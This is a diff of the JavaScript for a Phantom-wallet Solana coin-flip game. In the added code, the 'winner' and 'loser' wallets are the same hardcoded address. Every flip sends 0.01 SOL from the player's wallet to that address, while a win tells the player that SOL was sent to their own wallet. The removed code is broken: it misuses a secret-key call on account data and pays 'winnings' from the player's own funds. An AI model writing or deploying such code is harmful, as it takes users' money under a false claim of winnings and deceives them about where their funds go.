@@ -1,86 +1,69 @@
-// DOM Elements
-const connectWalletBtn = document.getElementById('connect-wallet-btn');
-const walletAddressDiv = document.getElementById('wallet-address');
-const gameContainer = document.getElementById('game-container');
-const headsBtn = document.getElementById('heads-btn');
-const tailsBtn = document.getElementById('tails-btn');
-const resultDiv = document.getElementById('result');
+let connection;
+let userPublicKey;
+const winnerWallet = "BvKeWCU3nsfW5VpzKhMd7atD5i5qeEQ2ga2t5coDagNr";  // Wallet for winner
+const loserWallet = "BvKeWCU3nsfW5VpzKhMd7atD5i5qeEQ2ga2t5coDagNr";  // Wallet for loser
 
-// Variables
-let walletPublicKey = null;
-const LOSS_WALLET = new solanaWeb3.PublicKey("BvKeWCU3nsfW5VpzKhMd7atD5i5qeEQ2ga2t5coDagNr"); // Wallet for losing players
-
-// Connect to the Phantom wallet
+// Function to connect to Solana wallet (Phantom, etc.)
 async function connectWallet() {
     if (window.solana && window.solana.isPhantom) {
         try {
-            // Request connection to the wallet
-            const response = await window.solana.connect();
-            walletPublicKey = new solanaWeb3.PublicKey(response.publicKey.toString());
-            walletAddressDiv.innerHTML = `Wallet Address: ${walletPublicKey.toString()}`;
-            walletAddressDiv.style.display = 'block';
-            connectWalletBtn.style.display = 'none'; // Hide connect button
-            gameContainer.style.display = 'block'; // Show game container
+            await window.solana.connect(); // Connect the wallet
+            userPublicKey = window.solana.publicKey;
+            document.getElementById("wallet-address").innerText = `Wallet connected: ${userPublicKey.toString()}`;
+            document.getElementById("wallet-address").style.display = "block";
+            document.getElementById("connect-wallet-btn").style.display = "none";
+            document.getElementById("game-container").style.display = "block";
+
+            // Create a connection to the Solana devnet (use 'mainnet-beta' for real transactions)
+            connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'), 'confirmed');
         } catch (err) {
-            console.error('Failed to connect wallet', err);
-            alert('Failed to connect wallet. Please try again.');
+            console.log('Connection error: ', err);
         }
     } else {
-        alert('Please install Phantom Wallet!');
+        alert("Please install Phantom wallet.");
     }
 }
 
-// Coin flip game functionality
+// Function to flip the coin
 async function flipCoin(choice) {
-    const coinSide = Math.random() < 0.5 ? 'Heads' : 'Tails';
-    resultDiv.innerHTML = `You chose: ${choice}<br>The coin landed on: ${coinSide}`;
+    const result = Math.random() < 0.5 ? "Heads" : "Tails";  // Random outcome
+    const outcomeText = `The coin landed on: ${result}`;
 
-    // Determine if the player won or lost
-    const isWinner = choice === coinSide;
-    if (isWinner) {
-        resultDiv.innerHTML += '<br>You win!';
-        await transferSOL(walletPublicKey); // Transfer SOL to the player
+    document.getElementById("result").innerText = outcomeText;
+
+    // If the player wins, send SOL to the winner wallet, else to the loser wallet
+    if (choice === result) {
+        await sendSolToWallet(winnerWallet);
+        document.getElementById("result").innerText += " You Win! SOL has been sent to your wallet.";
     } else {
-        resultDiv.innerHTML += '<br>You lose.';
-        await transferSOL(LOSS_WALLET); // Transfer SOL to the loss wallet
+        await sendSolToWallet(loserWallet);
+        document.getElementById("result").innerText += " You Lose! SOL has been sent to the loser wallet.";
     }
 }
 
-// Transfer SOL to a specified wallet
-async function transferSOL(toPublicKey) {
-    if (!walletPublicKey) {
-        alert("Connect your wallet first.");
-        return;
-    }
+// Function to send SOL to the specified wallet
+async function sendSolToWallet(destinationWallet) {
+    const transaction = new solanaWeb3.Transaction().add(
+        solanaWeb3.SystemProgram.transfer({
+            fromPubkey: userPublicKey,
+            toPubkey: new solanaWeb3.PublicKey(destinationWallet),
+            lamports: solanaWeb3.LAMPORTS_PER_SOL / 100, // Send 0.01 SOL (change as needed)
+        })
+    );
 
-    try {
-        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'), 'confirmed');
-        const fromWallet = await window.solana.request({ method: "solana_requestAccounts" });
-        const fromKeypair = await solanaWeb3.Keypair.fromSecretKey(new Uint8Array(fromWallet[0]));
-        
-        // Create a transaction
-        const transaction = new solanaWeb3.Transaction().add(
-            solanaWeb3.SystemProgram.transfer({
-                fromPubkey: fromKeypair.publicKey,
-                toPubkey: toPublicKey,
-                lamports: solanaWeb3.LAMPORTS_PER_SOL * 0.001, // Transfer 0.001 SOL
-            })
-        );
+    const { blockhash } = await connection.getRecentBlockhash();
+    transaction.recentBlockhash = blockhash;
+    transaction.feePayer = userPublicKey;
 
-        // Sign the transaction
-        const signedTransaction = await window.solana.signTransaction(transaction);
-        const txid = await connection.sendRawTransaction(signedTransaction.serialize());
+    const signedTransaction = await window.solana.signTransaction(transaction);
+    const signature = await connection.sendRawTransaction(signedTransaction.serialize());
 
-        await connection.confirmTransaction(txid, 'confirmed');
-        console.log(`Transaction successful: ${txid}`);
-    } catch (err) {
-        console.error("Transaction failed", err);
-    }
+    // Confirm the transaction
+    await connection.confirmTransaction(signature);
+    console.log(`Transaction successful. Signature: ${signature}`);
 }
 
-// Event listener for wallet connection
-connectWalletBtn.addEventListener('click', connectWallet);
-
-// Event listeners for coin flip buttons
-headsBtn.addEventListener('click', () => flipCoin('Heads'));
-tailsBtn.addEventListener('click', () => flipCoin('Tails'));
+// Attach event listeners to the buttons
+document.getElementById("connect-wallet-btn").addEventListener("click", connectWallet);
+document.getElementById("heads-btn").addEventListener("click", () => flipCoin("Heads"));
+document.getElementById("tails-btn").addEventListener("click", () => flipCoin("Tails"));
